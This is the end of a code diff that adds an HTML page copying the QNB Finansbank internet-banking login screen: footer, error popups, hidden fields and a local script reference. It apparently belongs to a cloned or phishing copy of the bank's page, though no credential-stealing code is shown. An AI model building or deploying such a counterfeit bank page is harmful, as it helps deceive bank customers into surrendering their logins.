+                                    <div id="webLoanInfoDiv" style="display: none;">
+
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <input type="hidden" name="ctl00$mainContentPlaceHolder$dd5fcb6461304a64adbfb0462736cb6c" id="dd5fcb6461304a64adbfb0462736cb6c">
+
+                    </div>
+                </div>
+            </section>
+
+
+            <div id="subContent" class="subContent" style="visibility:hidden;display:none">
+
+
+                <div id="VDAContainer">
+                    <div id="apDiv1" style="display: none">
+                        <img src="images/content_ok.png" width="8" height="15">
+                    </div>
+                    <div id="destekContent" style="display: none">
+                        <div>
+                            <img class="w-100" src="images/guvenlik_top.png" width="249" height="10">
+                        </div>
+                        <div class="middle title">
+                            <ul id="ctl00_subContentPlaceHolder_blSubContentMiddleList">
+                                <li>FinansŞifreniz yoksa veya FinansŞifrenizi unuttuysanız buraya <a href="https://internetsubesi.qnbfinansbank.com/Login/LoginPage.aspx#" class="english"><u>tıklayınız</u></a>.</li>
+                            </ul>
+                        </div>
+                        <div class="bottom">
+                            <img class="w-100" src="images/guvenlik_bottom.png" width="250" height="18">
+                        </div>
+                    </div>
+                </div>
+
+
+
+
+
+            </div>
+            <div class="footer">
+                <span class="master-footer">Her hakkı QNB Finansbank A.Ş.'ye aittir. © 2024</span>
+                <ul class="foot-links">
+                    <li>
+
+                        <a style="outline:none">English</a>
+                    </li>
+                    <li><a style="outline:none">Yapabileceğiniz İşlemler</a></li>
+                    <li><a style="outline:none">Sıkça Sorulan Sorular</a></li>
+                    <li><a style="outline:none">Bize Ulaşın</a></li>
+                </ul>
+                <div class="clr"></div>
+            </div>
+
+        </div>
+
+
+
+    <div class="hatamesaji1Confirm" id="hatamesaji1Confirm">
+        <div class="floatLeft">
+            <div class="popupheader_left" title="Finansbank"></div>
+        </div>
+        <div class="header2 floatLeft">
+            <div class="popup_header_icon">
+                <div title=""></div>
+            </div>
+            <div class="headerErrMsg">Hata !</div>
+            <a href="javascript:void(0)">
+                <div title="Kapat" class="close_icon" commandtype="cmdCancel" callbackfunction=""></div>
+            </a>
+        </div>
+        <div class="floatLeft">
+            <div title="Finansbank" class="popupheader_right"></div>
+        </div>
+        <div class="clearBoth"></div>
+        <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv">
+            <table width="100%" cellspacing="0" cellpadding="0" border="0">
+                <tbody>
+                    <tr>
+                        <td width="6px">
+                            <div class="imgRoundedCornerLeft"></div>
+                        </td>
+                        <td class="popupcontentRoundedCornerDiv_middle"></td>
+                        <td width="6px">
+                            <div class="imgRoundedCornerRight"></div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        <div class="popupcontent">
+            <div class="scrollbarmain">
+                <div class="scrollbar">
+                    <div class="track">
+                        <div class="thumb">
+                            <div class="end"></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="viewport">
+                    <div class="overview">
+                        <div class="hata_msj"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="popupButtonContainer">
+                <div class="iptal btnClassName" commandtype="cmdCancel" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="btnConfirmNo" border="0"></div>
+                    </a>
+                </div>
+                <div class="onay btnClassName" commandtype="cmdYes" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="btnConfirmYes" border="0"></div>
+                    </a>
+                </div>
+                <div class="resend btnClassName" commandtype="cmdResend" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="btnConfirmYes" border="0"></div>
+                    </a>
+                </div>
+                <div class="print btnClassName" commandtype="cmdPrint" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="btnPrint" border="0"></div>
+                    </a>
+                </div>
+                <div class="save btnClassName" commandtype="cmdSave" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="btnSave" border="0"></div>
+                    </a>
+                </div>
+                <div class="sendmail btnClassName" commandtype="cmdSentMail" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="btnSentMail" border="0"></div>
+                    </a>
+                </div>
+                <div class="delete btnClassName" commandtype="cmdDelete" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="btnDelete" border="0"></div>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv_bottom">
+            <table width="100%" cellspacing="0" cellpadding="0" border="0">
+                <tbody>
+                    <tr>
+                        <td width="6px">
+                            <div class="imgRoundedCornerLeft_bottom"></div>
+                        </td>
+                        <td class="popupcontentRoundedCornerDiv_middle_bottom"></td>
+                        <td width="6px">
+                            <div class="imgRoundedCornerRight_bottom"></div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="hatamesaji1ConfirmIframe" id="hatamesaji1ConfirmIframe" style="display: none;">
+        <div class="floatLeft">
+            <div class="popupheader_left" title="Finansbank"></div>
+        </div>
+        <div class="header2 floatLeft">
+            <div class="popup_header_icon">
+                <div title=""></div>
+            </div>
+            <div class="headerErrMsg">Hata !</div>
+            <a href="javascript:void(0)">
+                <div title="Kapat" class="close_icon" commandtype="cmdCancel" callbackfunction=""></div>
+            </a>
+        </div>
+        <div class="floatLeft">
+            <div title="Finansbank" class="popupheader_right"></div>
+        </div>
+        <div class="clearBoth"></div>
+        <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv">
+            <table width="100%" cellspacing="0" cellpadding="0" border="0">
+                <tbody>
+                    <tr>
+                        <td width="6px">
+                            <div class="imgRoundedCornerLeft"></div>
+                        </td>
+                        <td class="popupcontentRoundedCornerDiv_middle"></td>
+                        <td width="6px">
+                            <div class="imgRoundedCornerRight"></div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+        <div class="popupcontent">
+            <div class="popupButtonContainer">
+                <div class="iptal btnClassName" commandtype="cmdCancel" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="Div1" width="63" height="21" border="0"></div>
+                    </a>
+                </div>
+                <div class="onay btnClassName" commandtype="cmdYes" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="Div2" border="0"></div>
+                    </a>
+                </div>
+                <div class="print btnClassName" commandtype="cmdPrint" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="Div3" border="0"></div>
+                    </a>
+                </div>
+                <div class="resend btnClassName" commandtype="cmdResend" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="Div4" border="0"></div>
+                    </a>
+                </div>
+                <div class="save btnClassName" commandtype="cmdSave" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="Div5" border="0"></div>
+                    </a>
+                </div>
+                <div class="save btnClassName" commandtype="cmdSentMail" callbackfunction="">
+                    <a href="javascript:void(0)">
+                        <div id="Div6" border="0"></div>
+                    </a>
+                </div>
+            </div>
+        </div>
+        <div style="border-top: 0px none;" class="popupcontentRoundedCornerDiv_bottom">
+            <table width="100%" cellspacing="0" cellpadding="0" border="0">
+                <tbody>
+                    <tr>
+                        <td width="6px">
+                            <div class="imgRoundedCornerLeft_bottom"></div>
+                        </td>
+                        <td class="popupcontentRoundedCornerDiv_middle_bottom"></td>
+                        <td width="6px">
+                            <div class="imgRoundedCornerRight_bottom"></div>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+
+    <div class="popupbg" id="popupbg" style="opacity: 0.4; display: none;"></div>
+
+     <script src="js/jquery-3.6.4.min.js"></script>
+  <script type="text/javascript" src="js/script.js"></script>
+
+
+
+
+<noscript>You must enable javascript in your browser to view this webpage.</noscript>
+</body></html>
